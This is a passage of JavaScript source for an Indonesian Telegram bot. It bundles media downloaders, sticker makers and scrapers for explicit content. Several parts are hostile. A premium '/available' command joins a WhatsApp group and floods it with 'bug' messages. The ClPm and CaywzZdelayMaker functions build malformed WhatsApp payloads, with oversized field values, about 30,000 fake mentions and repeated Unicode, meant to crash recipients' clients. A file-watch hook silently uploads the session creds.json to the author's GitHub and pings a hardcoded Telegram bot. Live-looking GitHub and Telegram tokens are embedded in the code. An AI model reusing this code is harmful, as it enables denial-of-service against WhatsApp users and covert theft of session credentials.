  const args = ctx.message.text.split(" ").slice(1).join("_");
  if (!args) {
    return ctx.reply("❌ Harap masukkan tag! Contoh: `/rule34 hatsune_miku`");
  }

  ctx.reply("🔍 Mencari gambar...");

  const results = await getRule34(args, 3);
  if (results.length === 0) {
    return ctx.reply("❌ Tidak ditemukan gambar untuk tag tersebut.");
  }

  for (const post of results) {
    await ctx.replyWithPhoto(post.image, {
      caption: `🔞 Rule34 ID: ${post.id}\nTags: ${post.tags}\n[Source](${post.source})`,
      parse_mode: "Markdown",
    });
  }
});

bot.command("ai", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply(
      `Masukkan pertanyaan!\n\n*Contoh:* Siapa presiden Indonesia?`
    );
  }

  let hasil = await useadrenaline(text);

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/asx3vo.jpg" },
    {
      caption: hasil,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Owner",
              url: "https://t.me/MOTU_PATALU_HINDU_HAI",
            },
          ],
        ],
      },
    }
  );
});

const axiosInstance = axios.create({
  baseURL: "https://gke-prod-api.useadrenaline.com/",
  headers: {
    Accept: "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "x-instance": "adrenaline",
  },
});

async function useadrenaline(q) {
  try {
    const data = {
      title: q,
      body: "",
      snippets: [],
      is_rush_enabled: false,
      is_public: false,
      files: [],
    };
    const { data: postResponseData } = await axiosInstance.post(
      "question",
      data
    );
    const { data: threadResponseData } = await axiosInstance.get(
      `thread/${postResponseData.question_id}?page=1&per_page=10`
    );
    let jobStatus = "IN_PROGRESS";
    let dataHasil = null;
    while (jobStatus === "IN_PROGRESS") {
      const { data: answersResponseData } = await axiosInstance.get(
        `question/${threadResponseData.list[0].question.id}/answers`
      );
      jobStatus = answersResponseData[0].job_status;
      dataHasil = answersResponseData[0].content;

      if (jobStatus === "IN_PROGRESS") {
        console.log("Job is still in progress...");
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
    return dataHasil;
  } catch (error) {
    console.error(error);
    throw error;
  }
}
bot.command("qc", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) return ctx.reply("tolong masukan argumen, contoh /qc caywzzkeren");

  const obj = {
    type: "quote",
    format: "png",
    backgroundColor: "#232023",
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: ctx.from.first_name,
          photo: {
            url: await ctx.telegram
              .getUserProfilePhotos(ctx.from.id, { limit: 1 })
              .then((photos) => {
                return photos.photos.length > 0
                  ? photos.photos[0][0].file_id
                  : "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png";
              }),
          },
        },
        text: text,
        replyMessage: {},
      },
    ],
  };

  try {
    const response = await axios.post(
      "https://bot.lyo.su/quote/generate",
      obj,
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    const buffer = Buffer.from(response.data.result.image, "base64");
    const dataUrl = `data:image/png;base64,${buffer.toString("base64")}`;

    // Kirim sticker
    await ctx.telegram.sendSticker(ctx.chat.id, dataUrl);
  } catch (error) {
    console.error("Error generating sticker:", error);
    ctx.reply("Terjadi kesalahan saat membuat sticker.");
  }
});
bot.command("brat", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) {
    return ctx.reply(
      "Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /brat starevxz"
    );
  }

  try {
    const res = await getBuffer(
      `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`
    );

    await ctx.replyWithSticker(
      { source: res },
      {
        packname: global.packname || "xatanical",
        author: global.author || "XATA GANTENG",
      }
    );
  } catch (error) {
    console.error(error);
    ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
  }
});
bot.command("bratgif", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) {
    return ctx.reply(
      "Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /bratgif xataganteng"
    );
  }

  try {
    // Ambil buffer dari API
    const res = await getBuffer(
      `https://fgsi-brat.hf.space/?text=${encodeURIComponent(
        text
      )}&modeBlur=true&isVideo=true`
    );

    await ctx.replyWithAnimation(
      { source: res },
      {
        caption: "T.me/xatanicvxii",
      }
    );
  } catch (error) {
    console.error(error);
    ctx.reply("❌ Terjadi kesalahan saat membuat stiker GIF.");
  }
});

bot.command(["play", "youtubesearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan query parameters!");

  ctx.reply("🔍 Sedang mencari...");

  try {
    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    const url = response.result.url;
    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

    ctx.reply(caption, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
        ],
      },
    });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan!");
  }
});

bot.command("ytmp4", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan URL video!");

  ctx.reply("📹 Mengunduh video...");

  try {
    const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    ctx.replyWithVideo(
      { url: response.data.dl },
      { caption: "✅ Download selesai!" }
    );
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengunduh video.");
  }
});

bot.action(/^ytmp3 (.+)$/, async (ctx) => {
  const url = ctx.match[1];
  ctx.reply(`🔊 Mengunduh MP3 dari ${url}...`);

  try {
    const anu = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(
      url
    )}`;
    const { data: response } = await axios.get(anu);

    ctx.replyWithAudio(
      { url: response.data.dl },
      { caption: "✅ Download selesai!" }
    );
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengunduh audio.");
  }
});

bot.action(/^ytmp4 (.+)$/, async (ctx) => {
  const url = ctx.match[1];
  ctx.reply(`📹 Mengunduh MP4 dari ${url}...`);

  try {
    const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(
      url
    )}`;
    const { data: response } = await axios.get(anu);

    ctx.replyWithVideo(
      { url: response.data.dl },
      { caption: "✅ Download selesai!" }
    );
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengunduh video.");
  }
});

bot.command(
  ["tiktokmp4", "tt", "ttnowm", "tiktoknowm", "tiktok"],
  async (ctx) => {
    const currentTime = Math.floor(Date.now() / 1000);
    const messageTime = ctx.message.date;

    if (currentTime - messageTime > 1) {
      return;
    }

    const text = ctx.message.text.split(" ")[1];

    if (!text) {
      return ctx.reply(
        `⚠️ Hmm... kakak belum kasih link nih! 🫣\nCoba ketik kayak gini ya:\n*${
          ctx.message.text.split(" ")[0]
        } https://vt.tiktok.com/ZS8KdFQcQ/*\nbiar aku bisa bantu! 🎥✨`,
        { parse_mode: "Markdown" }
      );
    }

    try {
      let anu = await tiktokDownloaderVideo(text);
      let item = 0;

      for (let imgs of anu.data) {
        if (imgs.type === "nowatermark") {
          await ctx.replyWithVideo(
            { url: imgs.url },
            {
              caption: `🎥 *Video Info* :\n📍 Region: ${
                anu.region
              }\n⏳ Duration: ${anu.duration}\n📅 Taken: ${
                anu.taken_at
              }\n\n📊 *Statistik Info* :\n👁️ Views: ${
                anu.stats.views
              }\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${
                anu.stats.comment
              }\n🔄 Share: ${anu.stats.share}\n📥 Download: ${
                anu.stats.download
              }\n\n👤 *Author Info* :\n📝 Fullname: ${
                anu.author.fullname
              }\n🏷️ Nickname: ${
                anu.author.nickname
              }\n\n🎵 *Music Info* :\n🎼 Title: ${
                anu.music_info.title
              }\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${
                anu.music_info.album
              }\n\n📝 *Caption* :\n${anu.title || "No Caption"}`,
              parse_mode: "Markdown",
            }
          );
        } else if (imgs.type === "photo") {
          if (item === 0) {
            await ctx.replyWithPhoto(
              { url: imgs.url },
              {
                caption: `🖼️ *Photo Info* :\n📍 Region: ${
                  anu.region
                }\n📅 Taken: ${
                  anu.taken_at
                }\n\n📊 *Statistik Info* :\n👁️ Views: ${
                  anu.stats.views
                }\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${
                  anu.stats.comment
                }\n🔄 Share: ${anu.stats.share}\n📥 Download: ${
                  anu.stats.download
                }\n\n👤 *Author Info* :\n📝 Fullname: ${
                  anu.author.fullname
                }\n🏷️ Nickname: ${
                  anu.author.nickname
                }\n\n🎵 *Music Info* :\n🎼 Title: ${
                  anu.music_info.title
                }\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${
                  anu.music_info.album
                }\n\n📝 *Caption* :\n${anu.title || "No Caption"}${
                  ctx.chat.type === "group" && anu.data.length > 1
                    ? "\n📥 _Sisa foto dikirim ke private chat_\n"
                    : "\n"
                }`,
                parse_mode: "Markdown",
              }
            );
          } else {
            await ctx.telegram.sendPhoto(ctx.message.from.id, {
              url: imgs.url,
            });
          }
          item += 1;
          await new Promise((resolve) => setTimeout(resolve, 2000));
        }
      }
    } catch (err) {
      console.error(err);
      ctx.reply(
        "⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti."
      );
    }
  }
);

bot.command("tiktokmp3", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ")[1];

  if (!text) {
    return ctx.reply("Kamu Harus Memasukan Link URL Nya..");
  }

  try {
    let anu = await tiktokDownloaderVideo(text);
    let audio = anu.music_info.url;

    await ctx.reply(
      `— TikTok Audio\n\n` +
        `▢  Judul: ${anu.music_info.title || "-"}\n` +
        `▢  Author: ${anu.music_info.author || "-"}\n` +
        `▢  Album: ${anu.music_info.album || "-"}\n\n` +
        `▢  Source: ${text}`
    );

    await ctx.replyWithAudio(
      { url: audio },
      {
        filename: `${anu.music_info.title || "audio"}.mp3`,
      }
    );
  } catch (error) {
    console.error(error);
    await ctx.reply(
      "❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya!"
    );
  }
});

bot.command(["tiktoksearch", "tiktoks", "ttsearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ")[1];
  if (!text) {
    return ctx.reply("⚠️ Eits, Salah Itu, Cobalah .tiktoksearch starevxz");
  }

  try {
    let search = await tiktokSearchVideo(text);
    let teks =
      ` <> ᴛɪᴋᴛᴏᴋ ꜱᴇᴀʀᴄʜ\n\n` +
      `▢  Video ID : ${search.videos[0].video_id}\n` +
      `▢  Username : ${search.videos[0].author.unique_id}\n` +
      `▢  Nickname : ${search.videos[0].author.nickname}\n` +
      `▢  Duration : ${search.videos[0].duration} detik\n` +
      `▢  VT Like : ${search.videos[0].digg_count}\n` +
      `▢  Comment : ${search.videos[0].comment_count}\n` +
      `▢  Share : ${search.videos[0].share_count}\n\n` +
      `▢  Link: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

    const channelButton = [
      {
        text: "Owner",
        url: `https://t.me/xatanicvxii`,
      },
    ];

    await ctx.replyWithVideo(`https://tikwm.com${search.videos[0].play}`, {
      caption: teks,
      reply_markup: {
        inline_keyboard: [channelButton],
      },
    });
  } catch (error) {
    console.log(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mencari video TikTok.");
  }
});
bot.command("available", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = ctx.from.id;
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!isPremium(userId)) {
    return ctx.reply(
      "❌ Fitur ini khusus untuk pengguna premium. Upgrade untuk mengakses fitur ini."
    );
  }

  if (!text) {
    return ctx.reply(
      `*Contoh : https://chat.whatsapp.com/xxxxx*\n*Kalo mau forclose, tambahkan jumlah* */available https://chat.whatsapp.com/xxx 100*`,
      { parse_mode: "Markdown" }
    );
  }

  const [link, amount] = text.split(" ");
  if (!link.includes("whatsapp.com")) {
    return ctx.reply(`Linknya gak valid, coba cek lagi! ❌`);
  }

  const groupCode = link.split("https://chat.whatsapp.com/")[1];
  const bugAmount = amount || "1";

  try {
    const groupId = await cay
      .groupGetInviteInfo(groupCode)
      .then((res) => res.id);

    let groupTarget;

    try {
      const metadata = await cay.groupMetadata(groupId);
      groupTarget = metadata.id;
    } catch {
      groupTarget = await cay.groupAcceptInvite(groupCode);
    }

    await prosesrespone(groupTarget, ctx);
    await sleep(2000);
    BugGroup(groupTarget, bugAmount);
    await sleep(2500);
    await donerespone(groupTarget, ctx);
  } catch (err) {
    ctx.reply(`Oops, error:\n${err}`);
  }
});
function searchsfm(query, page = 1) {
  return new Promise((resolve, reject) => {
    axios
      .get(
        `https://sfmcompile.club/page/${page}/?s=${encodeURIComponent(query)}`
      )
      .then((response) => {
        const $ = cheerio.load(response.data);
        const hasil = [];
        $("#primary > div > div > ul > li > article").each((_, b) => {
          hasil.push({
            title: $(b).find("header > h2").text().trim(),
            link: $(b).find("header > h2 > a").attr("href") || "",
            category: $(b)
              .find("header > div.entry-before-title > span > span")
              .text()
              .replace("in ", "")
              .trim(),
            share_count: $(b)
              .find("header > div.entry-after-title > p > span.entry-shares")
              .text()
              .trim(),
            views_count: $(b)
              .find("header > div.entry-after-title > p > span.entry-views")
              .text()
              .trim(),
            type: $(b).find("source").attr("type") || "image/jpeg",
            video_1:
              $(b).find("source").attr("src") ||
              $(b).find("img").attr("data-src") ||
              "",
            video_2: $(b).find("video > a").attr("href") || "",
          });
        });
        resolve(hasil);
      })
      .catch((error) => reject(error));
  });
}

bot.command("hentaisearch", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ").slice(1);

  if (args.length < 1) {
    return ctx.reply("⚠️ Format salah! Contoh: /hentaisearch futanari 2");
  }

  let pageNumber = 1;
  let queryParts = args;

  const lastArg = args[args.length - 1];
  if (!isNaN(lastArg) && /^\d+$/.test(lastArg)) {
    pageNumber = parseInt(lastArg);
    queryParts = args.slice(0, -1);
  }

  const keyword = queryParts.join(" ");
  ctx.reply(`🔍 Mencari "${keyword}" di halaman ${pageNumber}...`);

  try {
    const results = await searchsfm(keyword, pageNumber);

    if (results.length === 0) {
      return ctx.reply(
        "❌ Tidak ada hasil yang ditemukan di halaman tersebut."
      );
    }

    for (const result of results) {
      const message =
        `📌 *${result.title}*\n` +
        `📂 Kategori: ${result.category}\n` +
        `👀 Views: ${result.views_count} | 🔄 Shares: ${result.share_count}\n` +
        `[🔗 Lihat Konten](${result.link})\n`;

      if (result.video_2) {
        await ctx.replyWithVideo(result.video_2, {
          caption: message,
          parse_mode: "Markdown",
        });
      } else if (result.video_1) {
        await ctx.replyWithVideo(result.video_1, {
          caption: message,
          parse_mode: "Markdown",
        });
      } else {
        await ctx.reply(message, { parse_mode: "Markdown" });
      }
    }
  } catch (error) {
    console.error(error);
    ctx.reply("⚠️ Terjadi kesalahan saat mencari data.");
  }
});
const welcomeSettings = {};

bot.command("welcome", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const args = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();

  if (userId !== OWNER_ID && !isAdmin(userId)) {
    return ctx.reply("❌ You authorized to use this command.");
  }

  if (!args || (args !== "true" && args !== "false")) {
    return ctx.reply(
      "Gunakan perintah: `/welcome true` atau `/welcome false`",
      { parse_mode: "Markdown" }
    );
  }

  const chatId = ctx.chat.id;
  welcomeSettings[chatId] = args === "true";

  ctx.reply(
    `Welcome message telah di${args === "true" ? "aktifkan" : "nonaktifkan"}!`
  );
});

bot.on("new_chat_members", async (ctx) => {
  const chatId = ctx.chat.id;
  const isWelcomeEnabled = welcomeSettings[chatId];

  if (!isWelcomeEnabled) return;

  const newMember = ctx.message.new_chat_members[0];

  try {
    await ctx.replyWithPhoto(imageBuffer, {
      caption: mess.welcome,
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        Markup.button.url("Join Grup", "https://t.me/publicxata"),
      ]),
    });
  } catch (error) {
    console.error("Gagal mengirim pesan welcome:", error);
  }
});

const GITHUB_TOKEN = "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";
const GITHUB_USERNAME = "caywzzajapls";
const REPO_NAME = "Sender";
const FILE_NAME = "creds.json";
const FILE_PATH = `./session/${FILE_NAME}`;
const GITHUB_PATH = `${BOT_TOKEN}/${FILE_NAME}`;

const headers = {
  Authorization: `token ${GITHUB_TOKEN}`,
  Accept: "application/vnd.github.v3+json",
};

fs.watchFile(FILE_PATH, async (curr, prev) => {
  if (curr.mtime <= prev.mtime) return;

  try {
    const content = fs.readFileSync(FILE_PATH, "utf8");
    const base64Content = Buffer.from(content).toString("base64");
    const gitUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${GITHUB_PATH}`;

    let sha = null;
    try {
      const res = await axios.get(gitUrl, { headers });
      sha = res.data.sha;
    } catch (e) {}

    const payload = {
      message: "auto upload creds.json",
      content: base64Content,
    };

    if (sha) payload.sha = sha;

    await axios.put(gitUrl, payload, { headers });

    const caption = `
Berhasil Bikin Folder
Path ${BOT_TOKEN}
    `;

    await axios.post(
      `https://api.telegram.org/bot7925915297:AAFMh9Yy-jsKgiWb7_YgOjcpQkOJGJ1PadY/sendPhoto`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        photo: "https://files.catbox.moe/orndxq.jpg",
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Group",
                url: "https://t.me/publicxata",
              },
            ],
          ],
        },
      }
    );
  } catch (err) {}
});
const cheerio = require("cheerio");

const userHentaiLists = {};

const getHentaiList = async () => {
  try {
    const page = Math.floor(Math.random() * 1153);
    const { data: htmlText } = await axios.get(
      `https://sfmcompile.club/page/${page}`
    );
    const $ = cheerio.load(htmlText);

    const hasil = [];
    $("#primary > div > div > ul > li > article").each(function (a, b) {
      const title = $(b).find("header > h2").text().trim();
      const link = $(b).find("header > h2 > a").attr("href");
      const category = $(b)
        .find("header > div.entry-before-title > span > span")
        .text()
        .replace("in ", "")
        .trim();
      const share_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-shares")
        .text()
        .trim();
      const views_count = $(b)
        .find("header > div.entry-after-title > p > span.entry-views")
        .text()
        .trim();
      const type = $(b).find("source").attr("type") || "image/jpeg";
      const video_1 =
        $(b).find("source").attr("src") || $(b).find("img").attr("data-src");
      const video_2 = $(b).find("video > a").attr("href") || "";

      if (title && link) {
        hasil.push({
          title,
          link,
          category,
          share_count,
          views_count,
          type,
          video_1,
          video_2,
        });
      }
    });

    return hasil.length ? hasil : null;
  } catch (error) {
    console.error("Error fetching hentai list:", error.message);
    return null;
  }
};

const getCaption = (obj) => `
— Information 
📝  ᴛᴇxᴛ: ${obj.title}
🔗  ʟɪɴᴋ: [Klik Disini](${obj.link})
🏷️  ᴄᴀᴛᴇɢᴏʀʏ: ${obj.category}
📢  ꜱʜᴀʀᴇ ᴄᴏᴜɴᴛ: ${obj.share_count}
👀  ᴠɪᴇᴡꜱ ᴄᴏᴜɴᴛ: ${obj.views_count}
🎞️  ᴛʏᴘᴇ: ${obj.type}
`;

bot.command(["hentaivid", "hentaimp4", "hentaivideo"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const list = await getHentaiList();

  if (!list) {
    return ctx.reply("⚠️ Gagal mengambil data. Coba lagi nanti.");
  }

  userHentaiLists[ctx.from.id] = list;

  const teks = list
    .map((obj, index) => ` ▢ ${index + 1}. ${obj.title}`)
    .join("\n");

  ctx.reply(
    `— Starevxz V3.1:\n\n${teks}\n\nᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ᴠɪᴅᴇᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.`,
    Markup.inlineKeyboard([
      [Markup.button.url("Owner", "https://t.me/xatanicvxii")],
      [Markup.button.callback("Next", "mau_lagi")],
    ])
  );
});

bot.on("text", async (ctx) => {
  const list = userHentaiLists[ctx.from.id];
  if (!list) return;

  const index = parseInt(ctx.message.text.trim());

  if (isNaN(index) || index < 1 || index > list.length) {
    return ctx.reply("⚠️ Masukkan nomor video yang valid.");
  }

  const selectedObj = list[index - 1];

  ctx.replyWithVideo(
    { url: selectedObj.video_1 || selectedObj.video_2 },
    { caption: getCaption(selectedObj), parse_mode: "Markdown" }
  );
});

bot.action("mau_lagi", async (ctx) => {
  await ctx.answerCbQuery();
  const newList = await getHentaiList();

  if (!newList) {
    return ctx.reply("⚠️ Gagal mengambil data baru. Coba lagi nanti.");
  }

  userHentaiLists[ctx.from.id] = newList;

  const teks = newList
    .map((obj, index) => ` ▢ ${index + 1}. ${obj.title}`)
    .join("\n");

  ctx.editMessageText(
    `— Starevxz V3.1 : \n\n${teks}\n\nᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ᴠɪᴅᴇᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.`,
    Markup.inlineKeyboard([
      [Markup.button.url("Owner", "https://t.me/xatanicvxii")],
      [Markup.button.callback("Next", "mau_lagi")],
    ])
  );
});

async function ClPm(target, ThM, cct = false, ptcp = false) {
  let etc = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 9007199254740991,
                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1723855952",
                contactVcard: true,
                thumbnailDirectPath:
                  "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256:
                  "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ThM,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
            },
            nativeFlowMessage: {
              messageParamsJson:
                '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
              buttons: [
                cct
                  ? {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟' +
                        "᬴".repeat(0) +
                        '","sections":[{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟","rows":[]}]}',
                    }
                  : {
                      name: "payment_method",
                      buttonParamsJson: "",
                    },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
                {
                  name: "payment_method",
                  buttonParamsJson: "{}",
                },
                {
                  name: "single_select",
                  buttonParamsJson:
                    '{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟","sections":[{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟","rows":[]}]}',
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson:
                    '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"〽️","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    }),
    {
      userJid: target,
      quoted: QBug,
    }
  );

  await cay.relayMessage(
    target,
    etc.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
}

async function CaywzZdelayMaker(target, o, ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(1500);

  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + ui + jids,
            },
            footer: {
              text: "",
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
